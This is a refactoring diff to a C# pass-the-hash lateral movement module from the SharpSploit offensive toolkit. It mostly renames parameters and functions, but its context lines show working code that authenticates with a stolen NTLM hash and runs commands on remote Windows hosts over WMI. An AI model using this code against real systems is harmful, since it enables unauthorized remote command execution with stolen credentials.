@@ -2,21 +2,21 @@
 // Project: SharpSploit (https://github.com/cobbr/SharpSploit)
 // License: BSD 3-Clause
 
+using SharpSploit.Execution;
+using SharpSploit.Generic;
+using SharpSploit.Misc;
+
 using System;
-using System.Linq;
-using System.Management;
 using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Diagnostics;
+using System.Linq;
+using System.Management;
 using System.Net;
 using System.Net.Sockets;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
-using SharpSploit.Execution;
-using SharpSploit.Misc;
-
-using SharpSploit.Generic;
 
 namespace SharpSploit.LateralMovement
 {
@@ -102,9 +102,9 @@ namespace SharpSploit.LateralMovement
         /// <summary>
         /// Determines if a username and hash has administrative privilege on a Target
         /// </summary>
-        /// <param name="username">The Username to query.</param>
-        /// <param name="hash">The NTLM hash for the user</param>
-        /// <param name="domain">The logon domain for the user</param>
+        /// <param name="Username">The Username to query.</param>
+        /// <param name="Hash">The NTLM hash for the user</param>
+        /// <param name="Domain">The logon domain for the user</param>
         /// <param name="Target">The Target to query.</param>
         /// <returns>True for Admin, False for not.</returns>
         /// <author>Scottie Austin (@checkymander)</author>
@@ -112,9 +112,9 @@ namespace SharpSploit.LateralMovement
         /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
         /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
         /// </remarks>
-        public static bool WMIAdminCheckWithHash(string username, string hash, string domain, string Target)
+        public static bool WMIAdminCheck(string Username, string Hash, string Domain, string Target)
         {
-            string result = WMIExecuteWithHash(username, hash, domain, Target, AdminCheck: true);
+            string result = WMIExecute(Username, Hash, Domain, Target, AdminCheck: true);
             if (result.Contains(" is a local administrator on "))
                 return true;
             else
@@ -124,26 +124,26 @@ namespace SharpSploit.LateralMovement
         /// <summary>
         /// Execute a command against multiple targets using Pass the Hash and WMI
         /// </summary>
-        /// <param name="username">The username to log on as.</param>
-        /// <param name="hash">The NTLM hash for the user.</param>
-        /// <param name="domain">The logon domain for the user.</param>
-        /// <param name="targets">The Target computers to run the command on.</param>
-        /// <param name="command">The Command to execute on the Target</param>
-        /// <param name="sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
+        /// <param name="Username">The username to log on as.</param>
+        /// <param name="Hash">The NTLM hash for the user.</param>
+        /// <param name="Domain">The logon domain for the user.</param>
+        /// <param name="Targets">The Target computers to run the command on.</param>
+        /// <param name="Command">The Command to execute on the Target</param>
+        /// <param name="Sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
         /// <param name="AdminCheck">Check if user is an Admin on the Target only.</param>
-        /// <param name="debug">Include debug information in the output</param>
+        /// <param name="Debug">Include debug information in the output</param>
         /// <returns>Returns a string containing execution results.</returns>
         /// <author>Scottie Austin (@checkymander)</author>
         /// <remarks>
         /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
         /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
         /// </remarks>
-        public static string WMIExecuteWithHash(string username, string hash, string domain, List<string> targets, string command = "", int sleep = 15, bool AdminCheck = false, bool debug = false)
+        public static string WMIExecute(string Username, string Hash, string Domain, List<string> Targets, string Command = "", int Sleep = 15, bool AdminCheck = false, bool Debug = false)
         {
             StringBuilder sb = new StringBuilder();
-            foreach (var Target in targets)
+            foreach (var Target in Targets)
             {
-                sb.AppendLine(WMIExecuteWithHash(username, hash, domain, Target, command, sleep, AdminCheck, debug));
+                sb.AppendLine(WMIExecute(Username, Hash, Domain, Target, Command, Sleep, AdminCheck, Debug));
             }
 
             return sb.ToString();
@@ -152,21 +152,21 @@ namespace SharpSploit.LateralMovement
         /// <summary>
         /// Execute a command against a Target using Pass the Hash and WMI
         /// </summary>
-        /// <param name="username">The username to log on as.</param>
-        /// <param name="hash">The NTLM hash for the user.</param>
-        /// <param name="domain">The logon domain for the user.</param>
+        /// <param name="Username">The username to log on as.</param>
+        /// <param name="Hash">The NTLM hash for the user.</param>
+        /// <param name="Domain">The logon domain for the user.</param>
         /// <param name="Target">The Target computers to run the command on.</param>
-        /// <param name="command">The Command to execute on the Target.</param>
-        /// <param name="sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
+        /// <param name="Command">The Command to execute on the Target.</param>
+        /// <param name="Sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
         /// <param name="AdminCheck">Check if user is an Admin on the Target only.</param>
-        /// <param name="debug">Include debug information in the output.</param>
+        /// <param name="Debug">Include debug information in the output.</param>
         /// <returns>Returns a string containing execution results.</returns>
         /// <author>Scottie Austin (@checkymander)</author>
         /// <remarks>
         /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
         /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
         /// </remarks>
-        public static string WMIExecuteWithHash(string username, string hash, string domain, string Target, string command = "", int sleep = 15, bool AdminCheck = false, bool debug = false)
+        public static string WMIExecute(string Username, string Hash, string Domain, string Target, string Command = "", int Sleep = 15, bool AdminCheck = false, bool Debug = false)
         {
             string Target_Short = String.Empty;
             string processID = BitConverter.ToString(BitConverter.GetBytes(Process.GetCurrentProcess().Id)).Replace("-00-00", "").Replace("-", "");
@@ -210,10 +210,10 @@ namespace SharpSploit.LateralMovement
             byte[] WMI_Namespace_Unicode = null;
             byte[] IPID2 = null;
 
-            if (!string.IsNullOrEmpty(hash) && !string.IsNullOrEmpty(username))
+            if (!string.IsNullOrEmpty(Hash) && !string.IsNullOrEmpty(Username))
             {
-                if (hash.Contains(":"))
-                    hash = hash.Split(':').Last();
+                if (Hash.Contains(":"))
+                    Hash = Hash.Split(':').Last();
             }
             else
             {
@@ -221,10 +221,10 @@ namespace SharpSploit.LateralMovement
             }
 
 
-            if (!string.IsNullOrEmpty(domain))
-                Output_Username = domain + '\\' + username;
+            if (!string.IsNullOrEmpty(Domain))
+                Output_Username = Domain + '\\' + Username;
             else
-                Output_Username = username;
+                Output_Username = Username;
 
             if (Target == "localhost")
             {
@@ -234,7 +234,7 @@ namespace SharpSploit.LateralMovement
 
             try
             {
-                if (debug) { output.AppendLine(String.Format("Connecting to: {0}", Target)); }
+                if (Debug) { output.AppendLine(String.Format("Connecting to: {0}", Target)); }
                 Target_Type = IPAddress.Parse(Target);
                 Target_Short = Target_Long = Target;
             }
@@ -266,7 +266,7 @@ namespace SharpSploit.LateralMovement
 
             if (WMI_Client.Connected)
             {
-                if (debug) { output.AppendLine(String.Format("Connected to: {0}", Target)); }
+                if (Debug) { output.AppendLine(String.Format("Connected to: {0}", Target)); }
                 NetworkStream WMI_Client_Stream = WMI_Client.GetStream();
                 byte[] WMI_Client_Receive = new byte[2048];
                 byte[] RPC_UUID = new byte[] { 0xc4, 0xfe, 0xfc, 0x99, 0x60, 0x52, 0x1b, 0x10, 0xbb, 0xcb, 0x00, 0xaa, 0x00, 0x21, 0x34, 0x7a };
@@ -281,7 +281,7 @@ namespace SharpSploit.LateralMovement
                 WMI_HostName = Encoding.ASCII.GetString(WMI_Hostname_Bytes);
                 if (Target_Short != WMI_HostName)
                 {
-                    if (debug) { output.AppendLine(String.Format("Switching Target name to {0} due to initial response.", WMI_HostName)); }
+                    if (Debug) { output.AppendLine(String.Format("Switching Target name to {0} due to initial response.", WMI_HostName)); }
                     Target_Short = WMI_HostName;
                 }
                 WMI_Client.Close();
@@ -301,8 +301,8 @@ namespace SharpSploit.LateralMovement
 
                 if (WMI_Client.Connected)
                 {
-                    if (debug) { output.AppendLine(String.Format("ReConnected to: {0} ", Target)); }
-                    if (debug) { output.AppendLine("Authenticating"); }
+                    if (Debug) { output.AppendLine(String.Format("ReConnected to: {0} ", Target)); }
+                    if (Debug) { output.AppendLine("Authenticating"); }
                     WMI_Client_Stream = WMI_Client.GetStream();
                     RPC_UUID = new byte[] { 0xa0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 };
                     Packet_RPC = WMIExec.RPCBind(3, new byte[] { 0xd0, 0x16 }, new byte[] { 0x01 }, new byte[] { 0x01, 0x00 }, RPC_UUID, new byte[] { 0x00, 0x00 });
@@ -319,11 +319,11 @@ namespace SharpSploit.LateralMovement
                     byte[] WMI_Target_Details = Utilities.GetByteRange(WMI_Client_Receive, WMI_NTLMSSP_bytes_index + 56 + WMI_Domain_Length, WMI_NTLMSSP_bytes_index + 55 + WMI_Domain_Length + WMI_target_Length);
                     byte[] WMI_Target_Time_Bytes = Utilities.GetByteRange(WMI_Target_Details, WMI_Target_Details.Length - 12, WMI_Target_Details.Length - 5);
                     StringBuilder sb = new StringBuilder();
-                    for (int i = 0; i < hash.Length - 1; i += 2) { sb.Append(hash.Substring(i, 2) + "-"); };
-                    byte[] NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(hash.Replace("-", "")));
+                    for (int i = 0; i < Hash.Length - 1; i += 2) { sb.Append(Hash.Substring(i, 2) + "-"); };
+                    byte[] NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(Hash.Replace("-", "")));
                     byte[] Auth_Hostname_Bytes = Encoding.Unicode.GetBytes(Auth_Hostname);
-                    byte[] Auth_Domain_Bytes = Encoding.Unicode.GetBytes(domain);
-                    byte[] Auth_Username_Bytes = Encoding.Unicode.GetBytes(username);
+                    byte[] Auth_Domain_Bytes = Encoding.Unicode.GetBytes(Domain);
+                    byte[] Auth_Username_Bytes = Encoding.Unicode.GetBytes(Username);
                     byte[] Auth_Domain_Length = BitConverter.GetBytes(Auth_Domain_Bytes.Length);
                     Auth_Domain_Length = new byte[] { Auth_Domain_Length[0], Auth_Domain_Length[1] };
                     byte[] Auth_Username_Length = BitConverter.GetBytes(Auth_Username_Bytes.Length);
@@ -337,7 +337,7 @@ namespace SharpSploit.LateralMovement
                     byte[] Auth_NTLM_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + 88);
                     HMACMD5 HMAC_MD5 = new HMACMD5();
                     HMAC_MD5.Key = NTLM_hash_bytes;
-                    string Username_And_Target = username.ToUpper();
+                    string Username_And_Target = Username.ToUpper();
                     byte[] Username_Bytes = Encoding.Unicode.GetBytes(Username_And_Target);
                     byte[] Username_And_Target_bytes = Username_Bytes.Concat(Auth_Domain_Bytes).ToArray<byte>();
                     byte[] NTLMv2_hash = HMAC_MD5.ComputeHash(Username_And_Target_bytes);
@@ -416,12 +416,12 @@ namespace SharpSploit.LateralMovement
                     else if (WMI_Client_Receive[2] == 2 && AdminCheck)
                     {
                         output.AppendLine(String.Format("{0} is a local administrator on {1}", Output_Username, Target_Long));
-                        if (debug) { output.AppendLine("Exiting due to AdminCheck being set"); }
+                        if (Debug) { output.AppendLine("Exiting due to AdminCheck being set"); }
                         return output.ToString();
                     }
                     else if (WMI_Client_Receive[2] == 2 && !AdminCheck)
                     {
-                        if (debug) { output.AppendLine("Continuing since AdminCheck is false"); }
+                        if (Debug) { output.AppendLine("Continuing since AdminCheck is false"); }
                         if (Target_Short == "127.0.0.1")
                         {
                             Target_Short = Auth_Hostname;
@@ -505,7 +505,7 @@ namespace SharpSploit.LateralMovement
 
                     if (WMI_Client_Random_Port.Connected)
                     {
-                        if (debug) { output.AppendLine(String.Format("Connected to: {0} using port {1}", Target_Long, WMI_Random_Port_Int)); }
+                        if (Debug) { output.AppendLine(String.Format("Connected to: {0} using port {1}", Target_Long, WMI_Random_Port_Int)); }
                         NetworkStream WMI_Client_Random_Port_Stream = WMI_Client_Random_Port.GetStream();
                         Packet_RPC = WMIExec.RPCBind(2, new byte[] { 0xd0, 0x16 }, new byte[] { 0x03 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }, new byte[] { 0x00, 0x00 });
                         Packet_RPC["RPCBind_FragLength"] = new byte[] { 0xd0, 0x00 };
@@ -523,12 +523,12 @@ namespace SharpSploit.LateralMovement
                         WMI_Target_Details = Utilities.GetByteRange(WMI_Client_Receive, WMI_NTLMSSP_bytes_index + 56 + WMI_Domain_Length, WMI_NTLMSSP_bytes_index + 55 + WMI_Domain_Length + WMI_target_Length);
                         WMI_Target_Time_Bytes = Utilities.GetByteRange(WMI_Target_Details, WMI_Target_Details.Length - 12, WMI_Target_Details.Length - 5);
                         sb = new StringBuilder();
-                        for (int i = 0; i < hash.Length - 1; i += 2) { sb.Append(hash.Substring(i, 2) + "-"); };
-                        NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(hash.Replace("-", "")));
+                        for (int i = 0; i < Hash.Length - 1; i += 2) { sb.Append(Hash.Substring(i, 2) + "-"); };
+                        NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(Hash.Replace("-", "")));
                         Auth_Hostname = Environment.MachineName;
                         Auth_Hostname_Bytes = Encoding.Unicode.GetBytes(Auth_Hostname);
-                        Auth_Domain_Bytes = Encoding.Unicode.GetBytes(domain);
-                        Auth_Username_Bytes = Encoding.Unicode.GetBytes(username);
+                        Auth_Domain_Bytes = Encoding.Unicode.GetBytes(Domain);
+                        Auth_Username_Bytes = Encoding.Unicode.GetBytes(Username);
                         Auth_Domain_Length = BitConverter.GetBytes(Auth_Domain_Bytes.Length);
                         Auth_Domain_Length = new byte[] { Auth_Domain_Length[0], Auth_Domain_Length[1] };
                         Auth_Username_Length = BitConverter.GetBytes(Auth_Username_Bytes.Length);
@@ -542,7 +542,7 @@ namespace SharpSploit.LateralMovement
                         Auth_NTLM_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + 88);
                         HMAC_MD5 = new HMACMD5();
                         HMAC_MD5.Key = NTLM_hash_bytes;
-                        Username_And_Target = username.ToUpper();
+                        Username_And_Target = Username.ToUpper();
                         Username_Bytes = Encoding.Unicode.GetBytes(Username_And_Target);
                         Username_And_Target_bytes = Username_Bytes.Concat(Auth_Domain_Bytes).ToArray();
                         NTLMv2_hash = HMAC_MD5.ComputeHash(Username_And_Target_bytes);
@@ -658,7 +658,7 @@ namespace SharpSploit.LateralMovement
 
                         while (WMI_Client_Stage != "exit")
                         {
-                            if (debug) { output.AppendLine(WMI_Client_Stage); }
+                            if (Debug) { output.AppendLine(WMI_Client_Stage); }
                             if (WMI_Client_Receive[2] == 3)
                             {
                                 string Error_Code = BitConverter.ToString(new byte[] { WMI_Client_Receive[27], WMI_Client_Receive[26], WMI_Client_Receive[25], WMI_Client_Receive[24] });
@@ -880,14 +880,14 @@ namespace SharpSploit.LateralMovement
                                                         Request_Call_ID = new byte[] { 0x0b, 0x00, 0x00, 0x00 };
                                                         Request_Opnum = new byte[] { 0x18, 0x00 };
                                                         Request_UUID = IPID2;
-                                                        byte[] Stub_Length = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 1769), 0, 1);
-                                                        byte[] Stub_Length2 = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 1727), 0, 1); ;
-                                                        byte[] Stub_Length3 = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 1713), 0, 1);
-                                                        byte[] Command_Length = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 93), 0, 1);
-                                                        byte[] Command_Length2 = Utilities.GetByteRange(BitConverter.GetBytes(command.Length + 16), 0, 1);
-                                                        byte[] Command_Bytes = Encoding.UTF8.GetBytes(command);
+                                                        byte[] Stub_Length = Utilities.GetByteRange(BitConverter.GetBytes(Command.Length + 1769), 0, 1);
+                                                        byte[] Stub_Length2 = Utilities.GetByteRange(BitConverter.GetBytes(Command.Length + 1727), 0, 1); ;
+                                                        byte[] Stub_Length3 = Utilities.GetByteRange(BitConverter.GetBytes(Command.Length + 1713), 0, 1);
+                                                        byte[] Command_Length = Utilities.GetByteRange(BitConverter.GetBytes(Command.Length + 93), 0, 1);
+                                                        byte[] Command_Length2 = Utilities.GetByteRange(BitConverter.GetBytes(Command.Length + 16), 0, 1);
+                                                        byte[] Command_Bytes = Encoding.UTF8.GetBytes(Command);
 
-                                                        string Command_Padding_Check = Convert.ToString(Decimal.Divide(command.Length, 4));
+                                                        string Command_Padding_Check = Convert.ToString(Decimal.Divide(Command.Length, 4));
                                                         if (Command_Padding_Check.Contains(".75"))
                                                         {
                                                             Command_Bytes = Command_Bytes.Concat(new byte[] { 0x00 }).ToArray();
